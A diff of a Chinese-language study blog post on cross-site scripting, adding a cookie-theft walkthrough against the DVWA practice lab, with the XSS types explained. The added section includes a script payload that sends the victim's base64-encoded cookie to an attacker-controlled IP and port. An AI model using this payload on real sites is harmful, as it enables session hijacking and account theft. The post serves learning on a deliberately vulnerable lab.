@@ -16,20 +16,26 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 漏洞分类反射性XSS又称为非持久性">
+    <meta name="description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 前端基础js可以在网页上实现任何功">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS">
-<meta property="og:url" content="https://tsy244.github.io/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/index.html">
+<meta property="og:url" content="https://tsy244.github.io/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 漏洞分类反射性XSS又称为非持久性">
+<meta property="og:description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 前端基础js可以在网页上实现任何功">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234935086.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235002011.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235504418.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png">
 <meta property="article:published_time" content="2023-12-01T12:22:37.000Z">
-<meta property="article:modified_time" content="2023-12-05T01:05:21.524Z">
+<meta property="article:modified_time" content="2023-12-07T16:01:34.384Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="基础漏洞学习">
+<meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png">
   
@@ -231,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k words
+          4.9k words
         
       </span>
     
@@ -242,7 +248,7 @@
         
         
         
-          33 mins
+          42 mins
         
       </span>
     
@@ -286,17 +292,81 @@
               <div class="markdown-body">
                 
                 <h1 id="漏洞简绍"><a href="#漏洞简绍" class="headerlink" title="漏洞简绍"></a>漏洞简绍</h1><p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
+<h1 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h1><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>可以在网页上实现任何功能，让其显示图片，试试更新的内容，交互式的地图，2D&#x2F;3D动画，滚动播放的视频等等</p>
+<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>浏览器的对象模型，JS可以通过BOM访问浏览器的相关信息。对浏览器进行交互。可以修改浏览器的大小啊，高度啥的。</p>
+<p>我的理解是可以把BOM抽象成为一个浏览器的接口看，用于操作浏览器的</p>
+<p>对于攻击者来说可以用于发现漏洞的存在，比如	XSS</p>
+<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>可以理解为QT的信号和槽函数。我们给某个东西发送一个信号，比如说我们可以给一个按钮点击的事件</p>
+<h3 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h3><p>这个可以理解为QT的槽函数，用于接受信号，然后作出反应</p>
+<p>针对于某一个事件的就叫做事件处理程序。事件处理程序的开头总是以on开头。比如onclick，onload。如果是模糊事件可以使用onblur</p>
+<p>常见的事件处理程序：</p>
+<h3 id="JS引用方式"><a href="#JS引用方式" class="headerlink" title="JS引用方式"></a>JS引用方式</h3><h4 id="使用Html标签"><a href="#使用Html标签" class="headerlink" title="使用Html标签"></a>使用Html标签</h4><ol>
+<li>使用script</li>
+<li>直接在元素事件中引用</li>
+<li>外部引用JS</li>
+</ol>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>主要是对用户造成危害，但是不会基本不会对服务器造成危害</p>
+<ol>
+<li>钓鱼欺骗</li>
+<li>网站挂马</li>
+<li>身份盗用</li>
+<li>盗取用户的信息</li>
+<li>垃圾信息发送</li>
+<li>劫持用户的web行为</li>
+<li>XSS蠕虫</li>
+</ol>
 <h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>又称为非持久性XSS，这种攻击往往具有一次性</p>
+<p>如果使用，这个需要调用使用社工，钓鱼</p>
+<p>可以使用弹窗发现</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png" srcset="/img/loading.gif" lazyload alt="image-20231201202831226"></p>
 <h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>又称为持久性XSS，攻击脚本基本储存在咪表的服务器当中，更具有隐蔽性。</p>
 <p>这种多用于博客，论坛，留言板当中，在发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库当中，当用户进行正常的额访问时，触发XSS代码</p>
 <h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>可以理解为不经过后端只在前端执行的代码</p>
 <h1 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h1><h2 id="cookile简绍"><a href="#cookile简绍" class="headerlink" title="cookile简绍"></a>cookile简绍</h2><p>Cookie是HTTP协议下，服务器可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户的客户端上的小文本文件，它可以包含多种信息</p>
+<h2 id="提前"><a href="#提前" class="headerlink" title="提前"></a>提前</h2><ol>
+<li><p>没有httponly</p>
+</li>
+<li><p>受害者可以直接访问到接收端</p>
+</li>
+<li><p>获取cookie之后目标用户没有退出</p>
+<p>这里如果用户有退出登录了，会话就消失了，也就是说cookie在这里就直接失效了</p>
+</li>
+</ol>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>我们分两个视角来发现，这个过程基于dvwa靶场</p>
+<p><strong>攻击者：</strong></p>
+<p>首先我访问正常的网页内容，然后发现了存在XSS漏洞，我作为攻击者我的目的是获取登录者的cookie然后登录他</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png" srcset="/img/loading.gif" lazyload alt="image-20231207234608819"></p>
+<p>我先尝试使用弹窗看是否存在xss</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png" srcset="/img/loading.gif" lazyload alt="image-20231207234837426"></p>
+<p>发现不能输入了，这个时候我们修改这个框框的长度</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234935086.png" srcset="/img/loading.gif" lazyload alt="image-20231207234935086"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235002011.png" srcset="/img/loading.gif" lazyload alt="image-20231207235002011"></p>
+<p>存在漏洞，那就直接搞</p>
+<p>有多种方式搭建xss平台</p>
+<p><strong>方式一：</strong></p>
+<p>尝试使用云服务器开启python的http服务</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207235504418.png" srcset="/img/loading.gif" lazyload alt="image-20231207235504418"></p>
+<p>然后构建下面的payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">open</span>=<span class="hljs-string">&#x27;http://8.130.123.25:11234/?q=&#x27;</span>+<span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231208000108029.png" srcset="/img/loading.gif" lazyload alt="image-20231208000108029"></p>
+<p>现在看我们的服务器是否发cookie</p>
 <h1 id="反射型XSS攻击流程"><a href="#反射型XSS攻击流程" class="headerlink" title="反射型XSS攻击流程"></a>反射型XSS攻击流程</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png" srcset="/img/loading.gif" lazyload alt="image-20231203204136766"></p>
 <p><strong>反射型XSS：</strong>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），<strong>一般容易出现在搜索页面</strong>。反射型XSS大多数是用来盗取用户的Cookie信息</p>
+<p>总结一下：</p>
+<ol>
+<li>发送url，给用户</li>
+<li>点击此链接</li>
+<li>服务器获取请求参数并且直接使用，服务器返回结果页面</li>
+</ol>
 <h1 id="存储型XSS攻击流程"><a href="#存储型XSS攻击流程" class="headerlink" title="存储型XSS攻击流程"></a>存储型XSS攻击流程</h1><p>按照字面意思把XSS放在服务器上</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png" srcset="/img/loading.gif" lazyload alt="image-20231203204249856"></p>
 <p><strong>存储型XSS：</strong>存储型XSS，持久化，代码是存储在服务器中的，如在<strong>个人信息</strong>或<strong>发表文章</strong>等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p>
+<p><strong>疑惑：</strong>、</p>
+<p>保存到服务器的数据库为什么会被执行？</p>
+<blockquote>
+<p>可以使用评论作为例子，当你使用XSS上传了一段恶意代码之后，这个评论不仅是你可以看到，而是所有的人都可以看到，也就是说前端加载这段代码，才会显示处理。只不过正常的评论是一段字符串，这个是恶意代码而已</p>
+</blockquote>
 <h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p><strong>DOM型XSS：</strong>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
 <p>部分可以触发DOM的JS属性</p>
 <blockquote>
@@ -331,7 +401,7 @@
 
 
 
-<h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul>
 <li>用户输入作为<strong>script</strong>标签内容</li>
 <li>用户输入作为HTML<strong>注释内容</strong></li>
 <li>用户输入作为HTML标签的<strong>属性名</strong></li>
@@ -399,7 +469,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#基础漏洞学习</a>
+        <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">#基础漏洞</a>
       
     </div>
   
@@ -412,7 +482,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>XSS</div>
-      <div>https://tsy244.github.io/2023/12/01/基础漏洞学习/XSS/</div>
+      <div>https://tsy244.github.io/2023/12/01/基础漏洞/XSS/</div>
     </div>
     <div class="license-meta">
       
@@ -456,7 +526,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/" title="短信轰炸漏洞">
+                      <a href="/2023/12/05/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/" title="短信轰炸漏洞">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">短信轰炸漏洞</span>
                         <span class="visible-mobile">Previous</span>
